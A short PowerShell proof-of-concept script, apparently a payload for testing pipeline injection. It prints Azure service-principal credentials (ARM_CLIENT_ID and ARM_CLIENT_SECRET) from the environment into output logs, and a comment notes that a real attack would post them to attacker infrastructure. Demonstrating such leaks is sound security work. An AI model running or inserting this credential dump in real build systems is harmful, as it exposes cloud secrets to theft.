Write-Output "Hello from attacker PoC"
# Exfiltrate secrets (in a real attack, this would curl or POST to attacker infra)
Write-Output "ARM_CLIENT_ID=$env:ARM_CLIENT_ID"
Write-Output "ARM_CLIENT_SECRET=$env:ARM_CLIENT_SECRET"
